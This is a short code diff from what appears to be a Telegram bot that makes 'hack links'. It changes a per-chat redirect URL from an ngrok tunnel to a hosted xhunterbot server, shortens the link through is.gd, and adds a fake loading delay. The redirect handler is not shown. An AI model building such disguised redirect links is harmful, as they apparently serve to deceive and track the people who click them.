@@ -146,7 +146,7 @@ async def create_hack_link(call):
 
 async def async_create_link(call):
     await asyncio.sleep(3)  # Имитация загрузки
-    long_url = f" https://3851-198-163-192-236.ngrok-free.app/redirect/{call.message.chat.id}"
+    long_url = f" https://xhunterbot.onrender.com/redirect/{call.message.chat.id}"
     
     async with aiohttp.ClientSession() as session:
         async with session.get(f"https://is.gd/create.php?format=simple&url={long_url}") as response:
